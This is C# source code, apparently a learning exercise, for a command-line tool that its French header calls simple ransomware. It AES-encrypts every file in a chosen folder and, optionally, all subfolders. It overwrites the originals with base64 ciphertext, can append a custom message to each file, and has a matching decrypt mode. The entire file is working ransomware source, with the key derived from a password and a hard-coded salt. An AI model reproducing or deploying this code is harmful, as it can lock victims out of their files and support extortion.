/*
 * RANSOMWARE simple avec exploration bibliothèque CommandLineParser pour la CLI :
 * A l'exécution chiffre ou rétablit les fichiers du répertoire saisi et au choix de tous les sous-répertoires
 * Un message peut être ajouté à la fin des données cryptées
 */

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using CommandLine;
using CommandLine.Text;

namespace SimpleRansomCli
{
    class Program
    {
        // PROPRIETES
        private static int appResult = 0;
        private bool isDecryptAction;
        private string folder;
        private string key;
        private bool areSubFoldersIncluded;
        private string message;

        // CONSTRUCTEUR
        public Program(Options a_options)
        {
            isDecryptAction = a_options.IsDecryptionAction;
            folder = a_options.Folder;
            key = a_options.Key;
            areSubFoldersIncluded = a_options.AreSubFoldersIncluded;
            message = a_options.Message;
        }

        static int Main(string[] args)
        {
            var result = Parser.Default.ParseArguments<Options>(args)
                                       .WithParsed(Run)
                                       .WithNotParsed(HandleParseError);            
            return appResult;
        }

        private static void HandleParseError(IEnumerable<Error> a_errs)
        {
            // Cas de la demande d'aide ou de la demande de version
            if (a_errs.IsHelp() || a_errs.IsVersion())
            {
                appResult = 1;
                return;
            }
            // Sinon affichage des erreurs et de l'aide
        }

        private static void Run(Options a_options)
        {
            // Vérification de l'existence du répertoire indiqué
            if (!Directory.Exists(a_options.Folder))
            {
                Console.WriteLine("Incorrect specified folder...");
                appResult = 2;
                return;
            }

            Program program = new Program(a_options);
            bool result = program.Run();
            if (result)
            {
                appResult = 0;
            }
            else
            {
                appResult = 3;
            }
            return; 
        }

        private bool Run()
        {
            //Console.WriteLine(HeadingInfo.Default);
            //Console.WriteLine(CopyrightInfo.Default);
            bool result = true;
            try
            {
                if (isDecryptAction)
                {
                    Decrypt();
                    Console.WriteLine("Decrypting files...");
                }
                else
                {
                    Encrypt();
                    Console.WriteLine("Encrypting files...");
                }
                Console.WriteLine("Done...");
            }
            catch (Exception)
            {
                // Echec...tant pis...
                Console.WriteLine("Failed...");
                result = false;
            }
            return result;
        }

        private void Encrypt()
        {
            string[] files = null;
            if (areSubFoldersIncluded)
            {
                files = Directory.GetFiles(folder, "*.*", SearchOption.AllDirectories);
            }
            else
            {
                files = Directory.GetFiles(folder);
            }

            foreach (var file in files)
            {
                EncryptSingleFile(file);
            }
        }

        private void EncryptSingleFile(string a_file)
        {
            byte[] data = File.ReadAllBytes(a_file);

            using (Aes encryptor = Aes.Create())
            {
                Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(key, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                encryptor.Key = pdb.GetBytes(32);
                encryptor.IV = pdb.GetBytes(16);
                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(data, 0, data.Length);
                        cs.Close();
                    }
                    string encryptedData = Convert.ToBase64String(ms.ToArray());
                    if (!string.IsNullOrEmpty(message))
                    {
                        encryptedData += "\nMESSAGE:\n" + message;
                    }
                    File.WriteAllText(a_file, encryptedData);
                }
            }
        }

        private void Decrypt()
        {
            string[] files = null;
            if (areSubFoldersIncluded)
            {
                files = Directory.GetFiles(folder, "*.*", SearchOption.AllDirectories);
            }
            else
            {
                files = Directory.GetFiles(folder);
            }

            foreach (var file in files)
            {
                DecryptSingleFile(file, key);
            }
        }

        private void DecryptSingleFile(string a_file, string a_key)
        {
            string data = File.ReadAllText(a_file);
            int index = data.IndexOf("MESSAGE:");
            int addedMessagelength = 0;
            if(index > 0)
            {
                addedMessagelength = data.Substring(index - 1).Length;
            }
            data = data.Substring(0, data.Length - addedMessagelength);
            byte[] decryptedData = Convert.FromBase64String(data);
            using (Aes encryptor = Aes.Create())
            {
                Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(a_key, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                encryptor.Key = pdb.GetBytes(32);
                encryptor.IV = pdb.GetBytes(16);
                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(decryptedData, 0, decryptedData.Length);
                        cs.Close();
                    }
                    File.WriteAllBytes(a_file, ms.ToArray());
                }
            }
        }

    }
}